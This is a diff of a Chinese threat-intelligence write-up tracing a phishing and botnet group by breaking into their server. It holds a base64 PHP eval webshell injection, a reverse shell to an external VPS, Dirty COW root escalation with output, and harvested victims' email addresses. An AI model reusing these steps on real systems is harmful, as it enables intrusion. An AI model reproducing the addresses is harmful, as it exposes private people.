+    <img src="https://camo.githubusercontent.com/e9c06b257b04ae1abb6e772fd260bebb371cd003/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e7574716a6f6b636a32306a33773835306e6732736331612f50726f46545064253230312e332e352d612e706e67" alt="ProFTPd 1.3.5-a.png-84.8kB" />
+</a></p>
 <h3 id="5２-获取权限"><strong>5.２ 获取权限</strong></h3>
-<p>使用用MSF执行 <img src="https://camo.githubusercontent.com/66530e49ceba7ca2ea5618ee552c06407a678e8c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f6b633962346e6e656d78616633793070736976776d347a2f6d73662d70726f667470645f6d6f64636f70795f657865632e706e67" alt="msf-proftpd_modcopy_exec.png-405kB"></p>
-<p>得到一个cmd功能的WebShell <img src="https://camo.githubusercontent.com/02fb9193416fa91c8339ca21987ff0be2b33b472/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38707134796a6c6939327775706374616a34716e6a326c7a2f323031382d31322d303325323032312d35302d31322545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-03 21-50-12屏幕截图.png-190.9kB"></p>
+<p>使用用MSF执行 <a href="https://camo.githubusercontent.com/66530e49ceba7ca2ea5618ee552c06407a678e8c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f6b633962346e6e656d78616633793070736976776d347a2f6d73662d70726f667470645f6d6f64636f70795f657865632e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/66530e49ceba7ca2ea5618ee552c06407a678e8c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f6b633962346e6e656d78616633793070736976776d347a2f6d73662d70726f667470645f6d6f64636f70795f657865632e706e67" alt="msf-proftpd_modcopy_exec.png-405kB" />
+</a></p>
+<p>得到一个cmd功能的WebShell <a href="https://camo.githubusercontent.com/02fb9193416fa91c8339ca21987ff0be2b33b472/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38707134796a6c6939327775706374616a34716e6a326c7a2f323031382d31322d303325323032312d35302d31322545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/02fb9193416fa91c8339ca21987ff0be2b33b472/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38707134796a6c6939327775706374616a34716e6a326c7a2f323031382d31322d303325323032312d35302d31322545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-03 21-50-12屏幕截图.png-190.9kB" />
+</a></p>
 <p>写入中国菜刀客户端</p>
 <pre><code>http://187.85.134.4/lndex.php?img=echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+Cg== |base64 -d  &gt;/var/www/index2.php
-</code></pre><p><img src="https://camo.githubusercontent.com/9095b45319d122fc51b5db5a38352c7f6aacc2b4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3731733668306f737575383034773130776261326375656d2f323031382d31322d303525323031392d32382d35332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-05 19-28-53屏幕截图.png-201.6kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/9095b45319d122fc51b5db5a38352c7f6aacc2b4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3731733668306f737575383034773130776261326375656d2f323031382d31322d303525323031392d32382d35332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/9095b45319d122fc51b5db5a38352c7f6aacc2b4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3731733668306f737575383034773130776261326375656d2f323031382d31322d303525323031392d32382d35332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-05 19-28-53屏幕截图.png-201.6kB" />
+</a></p>
 <h3 id="53-文件分析"><strong>5.3 文件分析</strong></h3>
 <p><strong>在Web目录下面发现用于发送钓鱼邮件的perl脚本、邮件钓鱼样本和大量的邮箱地址。以及挖矿后门、DDOS脚本等。</strong></p>
-<p><img src="https://camo.githubusercontent.com/c07e889f89f27482ddd65c8c63fa24001c4c1cb4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a666467786968746f30336d7963303635736f35783231312f3138372e38352e3133342e342d6c732e706e67" alt="187.85.134.4-ls.png-473kB"> <img src="https://camo.githubusercontent.com/6fc5503b71aae7bfb481ecd6662fbd1e28f3f2da/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3775666c706f70663373646d797966706476676c6e366c6d2f3138372e38352e3133342e342d6c736c732e706e67" alt="187.85.134.4-lsls.png-390.5kB"></p>
+<p><a href="https://camo.githubusercontent.com/c07e889f89f27482ddd65c8c63fa24001c4c1cb4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a666467786968746f30336d7963303635736f35783231312f3138372e38352e3133342e342d6c732e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/c07e889f89f27482ddd65c8c63fa24001c4c1cb4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a666467786968746f30336d7963303635736f35783231312f3138372e38352e3133342e342d6c732e706e67" alt="187.85.134.4-ls.png-473kB" />
+</a> <a href="https://camo.githubusercontent.com/6fc5503b71aae7bfb481ecd6662fbd1e28f3f2da/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3775666c706f70663373646d797966706476676c6e366c6d2f3138372e38352e3133342e342d6c736c732e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/6fc5503b71aae7bfb481ecd6662fbd1e28f3f2da/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3775666c706f70663373646d797966706476676c6e366c6d2f3138372e38352e3133342e342d6c736c732e706e67" alt="187.85.134.4-lsls.png-390.5kB" />
+</a></p>
 <h4 id="531-钓鱼模板"><strong>5.3.1 钓鱼模板</strong></h4>
 <p>图示是针对丹麦丹斯克银行（Danske Bank）和希腊阿尔法银行（Alpha Bank）的邮件钓鱼样本。</p>
-<p><img src="https://camo.githubusercontent.com/446514e6f12cb512b8058074a93d8e1eef77f855/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e6b716461613675667a736235396d777334753368347a6f2f254539253932253933254539254231254243254536254138254131254536253944254246312e706e67" alt="钓鱼模板1.png-50.5kB"> <img src="https://camo.githubusercontent.com/0a53b7baf724dbee27b57afbbca28aaae2179610/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f736e6b35327130716534366379796d736c767a65627864322f254539253933254236254538254131253843254536254138254131254536253944254246322e706e67" alt="银行模板2.png-79.3kB"> <img src="https://camo.githubusercontent.com/fc84dd8c3dc2f3b25e73d696b5531706df96e6cf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c78347a6877396a767973776369397a756f716f726671772f254539253933254236254538254131253843254536254138254131254536253944254246332e706e67" alt="银行模板3.png-37.5kB"> <img src="https://camo.githubusercontent.com/8266b46ffdb8bec642510f7033deb0695c902c3c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f743174776337727279786c64343676717477346d307430772f254539253933254236254538254131253843254536254138254131254536253944254246342e706e67" alt="银行模板4.png-40.4kB"> <img src="https://camo.githubusercontent.com/e671c05a8c7907573573d13f8e542d261918ef37/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f327477376970713730637130747a6964616b637871757a2f254539253933254236254538254131253843254536254138254131254536253944254246352e706e67" alt="银行模板5.png-24.7kB"> <img src="https://camo.githubusercontent.com/c2ce1b0f1de81627cc07af1e2121f38043066203/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3338746c383339356861786b3064713978386770307830372f254539253933254236254538254131253843254536254138254131254536253944254246362e706e67" alt="银行模板6.png-36.1kB"></p>
+<p><a href="https://camo.githubusercontent.com/446514e6f12cb512b8058074a93d8e1eef77f855/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e6b716461613675667a736235396d777334753368347a6f2f254539253932253933254539254231254243254536254138254131254536253944254246312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/446514e6f12cb512b8058074a93d8e1eef77f855/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e6b716461613675667a736235396d777334753368347a6f2f254539253932253933254539254231254243254536254138254131254536253944254246312e706e67" alt="钓鱼模板1.png-50.5kB" />
+</a> <a href="https://camo.githubusercontent.com/0a53b7baf724dbee27b57afbbca28aaae2179610/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f736e6b35327130716534366379796d736c767a65627864322f254539253933254236254538254131253843254536254138254131254536253944254246322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/0a53b7baf724dbee27b57afbbca28aaae2179610/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f736e6b35327130716534366379796d736c767a65627864322f254539253933254236254538254131253843254536254138254131254536253944254246322e706e67" alt="银行模板2.png-79.3kB" />
+</a> <a href="https://camo.githubusercontent.com/fc84dd8c3dc2f3b25e73d696b5531706df96e6cf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c78347a6877396a767973776369397a756f716f726671772f254539253933254236254538254131253843254536254138254131254536253944254246332e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/fc84dd8c3dc2f3b25e73d696b5531706df96e6cf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c78347a6877396a767973776369397a756f716f726671772f254539253933254236254538254131253843254536254138254131254536253944254246332e706e67" alt="银行模板3.png-37.5kB" />
+</a> <a href="https://camo.githubusercontent.com/8266b46ffdb8bec642510f7033deb0695c902c3c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f743174776337727279786c64343676717477346d307430772f254539253933254236254538254131253843254536254138254131254536253944254246342e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/8266b46ffdb8bec642510f7033deb0695c902c3c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f743174776337727279786c64343676717477346d307430772f254539253933254236254538254131253843254536254138254131254536253944254246342e706e67" alt="银行模板4.png-40.4kB" />
+</a> <a href="https://camo.githubusercontent.com/e671c05a8c7907573573d13f8e542d261918ef37/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f327477376970713730637130747a6964616b637871757a2f254539253933254236254538254131253843254536254138254131254536253944254246352e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/e671c05a8c7907573573d13f8e542d261918ef37/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f327477376970713730637130747a6964616b637871757a2f254539253933254236254538254131253843254536254138254131254536253944254246352e706e67" alt="银行模板5.png-24.7kB" />
+</a> <a href="https://camo.githubusercontent.com/c2ce1b0f1de81627cc07af1e2121f38043066203/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3338746c383339356861786b3064713978386770307830372f254539253933254236254538254131253843254536254138254131254536253944254246362e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/c2ce1b0f1de81627cc07af1e2121f38043066203/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3338746c383339356861786b3064713978386770307830372f254539253933254236254538254131253843254536254138254131254536253944254246362e706e67" alt="银行模板6.png-36.1kB" />
+</a></p>
 <h4 id="532-僵尸网络程序"><strong>5.3.2 僵尸网络程序</strong></h4>
-<p><img src="https://camo.githubusercontent.com/9b1faa497d52db708115599dad034472424be088/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6230683467666f62336a316e6b33763871703237676762692f697263332e706e67" alt="irc3.png-9.9kB"> <img src="https://camo.githubusercontent.com/0ca5bb2da1376ce7992dee0bb897387fbc8246bb/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f686d373171627569336734316e6e65686b747231703167742f697263322e706e67" alt="irc2.png-99.8kB"></p>
+<p><a href="https://camo.githubusercontent.com/9b1faa497d52db708115599dad034472424be088/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6230683467666f62336a316e6b33763871703237676762692f697263332e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/9b1faa497d52db708115599dad034472424be088/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6230683467666f62336a316e6b33763871703237676762692f697263332e706e67" alt="irc3.png-9.9kB" />
+</a> <a href="https://camo.githubusercontent.com/0ca5bb2da1376ce7992dee0bb897387fbc8246bb/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f686d373171627569336734316e6e65686b747231703167742f697263322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/0ca5bb2da1376ce7992dee0bb897387fbc8246bb/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f686d373171627569336734316e6e65686b747231703167742f697263322e706e67" alt="irc2.png-99.8kB" />
+</a></p>
 <h4 id="533-ddos脚本"><strong>5.3.3 DDOS脚本</strong></h4>
-<p><img src="https://camo.githubusercontent.com/3cd055ccd3e0634cd8b939b5ee75e908c7a936bd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f623938726e6f30306a7563646f6f3476313031776774656c2f64646f73322e706e67" alt="ddos2.png-75kB"></p>
+<p><a href="https://camo.githubusercontent.com/3cd055ccd3e0634cd8b939b5ee75e908c7a936bd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f623938726e6f30306a7563646f6f3476313031776774656c2f64646f73322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/3cd055ccd3e0634cd8b939b5ee75e908c7a936bd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f623938726e6f30306a7563646f6f3476313031776774656c2f64646f73322e706e67" alt="ddos2.png-75kB" />
+</a></p>
 <h4 id="534-邮箱地址"><strong>5.3.4 邮箱地址</strong></h4>
 <blockquote>
 <p>统计目录下的 txt 文本数量，发现共有六十二万四千个邮箱地址。</p>
@@ -754,7 +886,8 @@ ProFTPD中使用的mod_copy模块存在未授权访问风险，导致ProFTPD自�
 <pre><code> ⚡ root@kali  /tmp/187.85.134.4/www/cat  wc -l *.txt     
 
 624000 总用量
-</code></pre><p>主流邮箱检索</p>
+</code></pre>
+<p>主流邮箱检索</p>
 <pre><code> ⚡ root@kali  /tmp/187.85.134.4/www/cacat  grep &quot;@gmail.com&quot; *.txt |head -n 20 
 
 a0000001.txt:a.l.v.e.rtadsmileyksso@gmail.com
@@ -817,24 +950,32 @@ a0000221.txt:fjfzpy@163.com
 a0000227.txt:fon@163.com
 a0000259.txt:guangdk@163.com
 a0000311.txt:huhuanqiang00161@163.com
-</code></pre><h3 id="54-提权"><strong>5.4 提权</strong></h3>
+</code></pre>
+<h3 id="54-提权"><strong>5.4 提权</strong></h3>
 <h4 id="541-cve-2013-2094cve-2013-1763提权"><strong>5.4.1 CVE-2013-2094，CVE-2013-1763提权</strong></h4>
 <p>查看apache日志目录，发现没有权限。</p>
 <pre><code>[/var/www/]$ls -al /var/log/apache2/
 ls: cannot open directory /var/log/apache2/: Permission denied
-</code></pre><p>内核版本为<code>3.5.0-23</code>，尝试提权。</p>
+</code></pre>
+<p>内核版本为<code>3.5.0-23</code>，尝试提权。</p>
 <pre><code>[/var/www/]$cat /etc/issue
 Ubuntu 12.04.2 LTS \n \l
 
 [/var/www/]$uname -an
 Linux medidor2 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013  GNU/Linux
-</code></pre><p><img src="https://camo.githubusercontent.com/c36b462425635925d59cfd9e84bbb33b0d286f12/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a787535746f306e633864653079747a39726965756c736f2f332e352e302d32332d612e706e67" alt="3.5.0-23-a.png-104.5kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/c36b462425635925d59cfd9e84bbb33b0d286f12/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a787535746f306e633864653079747a39726965756c736f2f332e352e302d32332d612e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/c36b462425635925d59cfd9e84bbb33b0d286f12/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a787535746f306e633864653079747a39726965756c736f2f332e352e302d32332d612e706e67" alt="3.5.0-23-a.png-104.5kB" />
+</a></p>
 <pre><code>WebShell反弹：
 [/var/www/]$cd /var/tmp;./pty  xxx.xxx.xxx.xxx 443
 
 外网VPS监听：
 socat file:`tty`,echo=0,raw tcp-listen:443
-</code></pre><p><img src="https://camo.githubusercontent.com/c0c1381a55e04b5b7f3b28873627cffeffbccbde/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32366d637173656b7a73646c396a6d686d613232673734392f323031382d31322d303425323031342d34332d30352545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-04 14-43-05屏幕截图.png-61.7kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/c0c1381a55e04b5b7f3b28873627cffeffbccbde/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32366d637173656b7a73646c396a6d686d613232673734392f323031382d31322d303425323031342d34332d30352545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/c0c1381a55e04b5b7f3b28873627cffeffbccbde/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32366d637173656b7a73646c396a6d686d613232673734392f323031382d31322d303425323031342d34332d30352545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-04 14-43-05屏幕截图.png-61.7kB" />
+</a></p>
 <p>实际测试<code>CVE-2013-2094，CVE-2013-1763</code>均无法提权。</p>
 <pre><code>CVE-2013-2094
 Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu
@@ -842,12 +983,15 @@ Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu
 
 CVE-2013-1763
 Linux Kernel &lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation
-</code></pre><h4 id="542-脏牛提权"><strong>5.4.2 脏牛提权</strong></h4>
+</code></pre>
+<h4 id="542-脏牛提权"><strong>5.4.2 脏牛提权</strong></h4>
 <p><strong>祭出大杀器CVE-2016-5195（脏牛） ， 理论上通杀 2.6.22 &lt; 3.9 (x86/x64)的内核版本。</strong></p>
 <blockquote>
 <p>在本地环境提权测试过程中发现，i386架构下使用cowroot提权时EXP会破坏源文件，导致提权失败。而使用dirtycow-mem仅修改内存则没有问题，但是存在内核崩溃的风险。这两个EXP都是利用/proc/self/mem提权，前一个修改文件，后一个修改内存。</p>
 </blockquote>
-<p>如图所示： <img src="https://camo.githubusercontent.com/2692b63d3e12f741e7dabd3bbb210ea0d7ebc20c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6171773777346e6f7370386662696c777861386e37696e672f53637265656e73686f742d323031392d312d3233253230436172626f6e2e706e67" alt="Screenshot-2019-1-23 Carbon.png-68.1kB"></p>
+<p>如图所示： <a href="https://camo.githubusercontent.com/2692b63d3e12f741e7dabd3bbb210ea0d7ebc20c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6171773777346e6f7370386662696c777861386e37696e672f53637265656e73686f742d323031392d312d3233253230436172626f6e2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/2692b63d3e12f741e7dabd3bbb210ea0d7ebc20c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6171773777346e6f7370386662696c777861386e37696e672f53637265656e73686f742d323031392d312d3233253230436172626f6e2e706e67" alt="Screenshot-2019-1-23 Carbon.png-68.1kB" />
+</a></p>
 <p>使用dirtycow-mem.c提权时需要注意：i386架构下编译前需要将源代码中libc路径修改为目标系统libc路径，否则执行时找不到文件。</p>
 <pre><code>#define SHELLCODE	&quot;\x31\xc0\xc3&quot;
 #define SPACE_SIZE	256
@@ -856,7 +1000,8 @@ Linux Kernel &lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local 
 
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
-</code></pre><p><strong>Give me root 　:），提权成功。</strong></p>
+</code></pre>
+<p><strong>Give me root 　:），提权成功。</strong></p>
 <pre><code>www-data@medidor2:/tmp$gcc -Wall -o hello dirtycow-mem.c -ldl -lpthread
 www-data@medidor2:/tmp$ ls
 hello
@@ -876,7 +1021,8 @@ root@medidor2:/tmp# [*] exploiting (unpatch)
 
 root@medidor2:/tmp# id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre><p>打包Apache日志。</p>
+</code></pre>
+<p>打包Apache日志。</p>
 <pre><code>✘ ⚡ root@kali  ls /var/log/apache2
 access  error  other_vhosts_access.log
 
@@ -895,7 +1041,8 @@ access  error  other_vhosts_access.log
 apache2-log.tar.gz  100%[===================&gt;]   8.83M  29.6KB/s  用时 5m 45s  
 
 2018-11-11 11:11:11 (26.2 KB/s) - 已保存 “apache2-log.tar.gz” [9258688/9258688])
-</code></pre><h3 id="55-分析日志"><strong>5.5 分析日志</strong></h3>
+</code></pre>
+<h3 id="55-分析日志"><strong>5.5 分析日志</strong></h3>
 <p>分析IP访问情况</p>
 <pre><code>⚡ root@kali  /tmp/  grep &quot;/cacat/&quot; * |grep &quot;php&quot; | awk -F &quot;:&quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]&quot; &quot;i;}}' |sort -t &quot; &quot; -k 1 -n -r &gt;ip.txt
 
@@ -949,7 +1096,8 @@ IP: 66.249.73.64 来自: Google 骨干网
 IP: 154.118.69.165 来自: 尼日利亚 
 IP: 66.249.73.67 来自: Google 骨干网
 ......
-</code></pre><p>根据路径名判断，疑似受害者访问了钓鱼页面。</p>
+</code></pre>
+<p>根据路径名判断，疑似受害者访问了钓鱼页面。</p>
 <pre><code> ⚡ root@kali  /tmp/ grep &quot;/cacat&quot; *| grep &quot;php&quot; |grep &quot;POST&quot; |awk -F &quot;:&quot; '{print $2 $6}' |sort |uniq 
 109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;
 109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=120&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;
@@ -962,11 +1110,13 @@ IP: 66.249.73.67 来自: Google 骨干网
 
 197.211.60.52 - - [07/Sep/2018:16:02:40 -0300] &quot;GET /cacat/nnnnn.zip HTTP/1.1&quot; 200 4489167 &quot;http://187.85.134.4/cacat/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&quot;
  
-</code></pre><p><strong>查看web目录下txt文件访问情况，总共有一万多IP。访问地址包含受害者主机IP、各种搜索引擎爬虫IP、各路黑客的IP等等。</strong></p>
+</code></pre>
+<p><strong>查看web目录下txt文件访问情况，总共有一万多IP。访问地址包含受害者主机IP、各种搜索引擎爬虫IP、各路黑客的IP等等。</strong></p>
 <pre><code>grep &quot;/cacat/&quot; * |grep &quot;txt&quot; | awk -F &quot;:&quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]&quot; &quot;i;}}' |sort -t &quot; &quot; -k 1 -n -r  &gt;ip.txt
  ⚡ root@kali  ~/Desktop  wc -l ip.txt                                                        
 10101 ip.txt
-</code></pre><h3 id="56-访问ip热力图"><strong>5.6 访问IP热力图</strong></h3>
+</code></pre>
+<h3 id="56-访问ip热力图"><strong>5.6 访问IP热力图</strong></h3>
 <h4 id="561-ip转经纬度坐标"><strong>5.6.1 IP转经纬度坐标</strong></h4>
 <p>将获得的IP转换成经纬度坐标，再通过百度地图API生成热力图</p>
 <blockquote>
@@ -1005,7 +1155,8 @@ with open(&quot;/tmp/ip.txt&quot;) as f:
 
 file.write(&quot;];\n&quot;)
 file.close()
-</code></pre><h4 id="562-调用百度地图api"><strong>5.6.2 调用百度地图API</strong></h4>
+</code></pre>
+<h4 id="562-调用百度地图api"><strong>5.6.2 调用百度地图API</strong></h4>
 <p>本地调用百度地图 JavaScript API： map.html</p>
 <pre><code>&lt;!DOCTYPE html&gt;
 &lt;html lang=&quot;en&quot;&gt;
@@ -1101,13 +1252,20 @@ file.close()
 &lt;/script&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><h4 id="563-生成热力图"><strong>5.6.3 生成热力图</strong></h4>
+</code></pre>
+<h4 id="563-生成热力图"><strong>5.6.3 生成热力图</strong></h4>
 <p>如图所示，欧洲IP居多，亚洲也不少。至于有多少主机沦陷和多少受害者上钩，无法准确判断。</p>
-<p><img src="https://camo.githubusercontent.com/447d0dcd09fed26ab2f4f9ed99b943756a71c7cc/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f777465643535396a7a63643278397074396c6f7367326c752f2545372538332541442545352538412539422545352539422542452545462542432539312e706e67" alt="热力图１.png-526.6kB"></p>
+<p><a href="https://camo.githubusercontent.com/447d0dcd09fed26ab2f4f9ed99b943756a71c7cc/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f777465643535396a7a63643278397074396c6f7367326c752f2545372538332541442545352538412539422545352539422542452545462542432539312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/447d0dcd09fed26ab2f4f9ed99b943756a71c7cc/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f777465643535396a7a63643278397074396c6f7367326c752f2545372538332541442545352538412539422545352539422542452545462542432539312e706e67" alt="热力图１.png-526.6kB" />
+</a></p>
 <hr>
-<p><img src="https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67" alt="热力图2.png-357.6kB"></p>
+<p><a href="https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67" alt="热力图2.png-357.6kB" />
+</a></p>
 <hr>
-<p><img src="https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67" alt="热力图3.png-1196.3kB"></p>
+<p><a href="https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67" alt="热力图3.png-1196.3kB" />
+</a></p>
 <hr>
 <h2 id="六信息汇总">六、信息汇总</h2>
 <p>根据所得信息汇总，对这个黑客组织信息进行简单分析，仅供参考。</p>
@@ -1180,7 +1338,8 @@ file.close()
 178.128.221.199 （希腊）- - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;
 
 197.211.61.82 （尼日利亚) - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;
-</code></pre><h3 id="65-被黑网站"><strong>6.5 被黑网站</strong></h3>
+</code></pre>
+<h3 id="65-被黑网站"><strong>6.5 被黑网站</strong></h3>
 <pre><code>不完全统计
 
 rosturplast.com
@@ -1223,29 +1382,174 @@ reinamarltda.cl
 cobraz.pt
 www.stmarypellaia.com
 webcam.wm-itservice.at
-</code></pre><hr>
+</code></pre>
+<hr>
 <h2 id="七攻击路径还原">七、攻击路径还原</h2>
 <p>复盘整个溯源过程，还原攻击者攻击路径。</p>
-<p><img src="https://camo.githubusercontent.com/e54ac5ad8cbe0d6686b5eb04b0f92aa9263ceda7/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f75303663797438757772766f33323172617374706b746b742f254536253934254242254535253837254242254538254237254146254535254245253834254546254243253931253230253238342532392e706e67" alt="攻击路径１ (4).png-215.2kB"></p>
+<p><a href="https://camo.githubusercontent.com/e54ac5ad8cbe0d6686b5eb04b0f92aa9263ceda7/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f75303663797438757772766f33323172617374706b746b742f254536253934254242254535253837254242254538254237254146254535254245253834254546254243253931253230253238342532392e706e67" target="_blank">
